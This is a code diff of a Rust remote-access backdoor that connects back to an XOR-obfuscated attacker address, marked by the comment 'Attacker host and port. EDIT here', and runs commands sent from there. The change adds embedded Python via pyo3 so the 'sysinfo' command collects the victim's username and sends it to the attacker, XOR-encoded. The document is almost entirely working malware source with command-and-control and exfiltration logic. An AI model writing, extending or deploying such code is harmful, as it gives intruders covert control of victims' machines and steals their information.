@@ -4,6 +4,8 @@ use std::process::Command;
 use std::str::from_utf8;
 use std::thread;
 use std::time::Duration;
+use pyo3::prelude::*;
+use pyo3::types::IntoPyDict;
 
 fn int_xor(clear_text: &str, key: u8) -> String {
 	/*
@@ -23,14 +25,24 @@ fn int_xor(clear_text: &str, key: u8) -> String {
 	return enc_text;
 }
 
-fn system_info() {
-	println!("{}", cfg!(target_arch));
+fn system_info(conn: &mut TcpStream, key: u8) -> PyResult<()> {
+	let gil = Python::acquire_gil();
+	let py = gil.python();
+	let sys = py.import("sys")?;
+	let version: String = sys.get("version")?.extract()?;
+	let locals = [("os", py.import("os")?)].into_py_dict(py);
+	let code = "os.getenv('USER') or os.getenv('USERNAME') or 'Unknown'";
+	let ret: String = py.eval(code, None, Some(&locals))?.extract()?;
+	conn.write(
+		int_xor(&ret, key).as_bytes()
+	).unwrap();
+	Ok(())
 }
 
 fn main() {
 	let key: u8 = 16;
 	let mut flag: u8 = 0;
-	let addr = &*int_xor("!\"\'> > >!*((((", key); // Attacker host and port. EDIT here
+	let addr = &*int_xor("! >%\">#!>!& *( ( ", key); // Attacker host and port. EDIT here
 	loop {
 		match TcpStream::connect(addr) {
 			// Try create TCP connection
@@ -57,10 +69,7 @@ fn main() {
 							}
 							else if cmd == "sysinfo"
 							{
-								system_info();
-								conn.write(
-									int_xor("System info" as &str, key).as_bytes()
-								).unwrap();
+								system_info(&mut conn, key);
 							}
 							else
 							{
